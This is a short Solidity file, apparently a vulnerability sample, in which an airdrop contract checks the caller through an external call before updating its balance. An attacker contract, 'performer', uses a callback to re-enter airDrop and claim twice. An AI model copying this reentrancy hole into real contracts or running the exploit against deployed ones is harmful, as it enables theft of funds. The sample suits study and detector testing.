// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract AdjustmentBank {
  mapping (address => uint) public credentialBenefits;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() hasNoFunds supportsId  public{
    credentialBenefits[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsId() {
    require(keccak256(abi.encodePacked("Nu Token")) == OrganBank(msg.sender).supportsId());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoFunds {
      require(credentialBenefits[msg.sender] == 0);
      _;
  }
}

contract OrganBank{
    function supportsId() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract performer {
    bool holdsBeenCalled;
    function supportsId() external returns(bytes32){
        if(!holdsBeenCalled){
            holdsBeenCalled = true;
            AdjustmentBank(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address badge) public{
        AdjustmentBank(badge).airDrop();
    }
}